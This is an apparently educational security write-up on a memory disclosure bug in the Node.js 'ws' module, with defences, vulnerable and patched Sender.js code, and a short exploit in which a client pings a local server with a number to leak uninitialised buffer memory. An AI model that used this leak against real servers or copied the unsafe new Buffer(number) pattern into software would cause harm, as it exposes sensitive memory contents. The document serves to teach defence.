## Memory Disclosure
Memory disclosure vulnerabilities are related to the information disclosure class of bugs. It occurs when a system reveals system data or debugging information that helps an adversary learn about the system and form a plan of attack. The "ws" module had a vulnerability that when exploited would allow the allocation of memory through ping frames. The module transforms data into Buffer instances insecurely and as a result would reveal non-zeroed buffers. The module didn't do checks on the type of data it was sending back to the client.

### Defenses
- Audit the modules your application depends on
- Use a monitoring platform such as N|Solid which has a **ZeroFillAllocation** feature that zero-fills memory allocated for Buffers

### Vulnerable Code View
```
/*
Depending on the parameters passed, ws would allocate different bytes of memory.
var x = new Buffer(100); // 100 bytes
var x = new BUffer('100'); // 3 bytes
*/

// ws/lib/Sender.js line 155:
if (data && (typeof data.byteLength !== 'undefined' || typeof data.buffer !== 'undefined')) {
  data = getArrayBuffer(data);
} else {
  data = new Buffer(data);
}
```

### Patched Code
```
// ws/lib/Sender.js line 155:
if (data && (typeof data.byteLength !== 'undefined' || typeof data.buffer !== 'undefined')) {
  data = getArrayBuffer(data);
} else {
  /* If people want to send a number, this would allocate the number in
    bytes as memory size instead of storing the number as buffer value.
    So we need to transform it to string in order to prevent possible
    vulnerabilities / memory attacks.
  */
  if (typeof data === 'number') data = data.toString();
  data = new Buffer(data);
}

```

### Exploit Code
```
var ws = require('ws')

var server = new ws.Server({ port: 9000 })
var client = new ws('ws://localhost:9000')

client.on('open', function () {
  console.log('open')
  client.ping(50) // this sends a non-zeroed buffer of 50 bytes

  client.on('pong', function (data) {
    console.log('got pong')
    console.log(data) // Data from the client.
  })
})
```
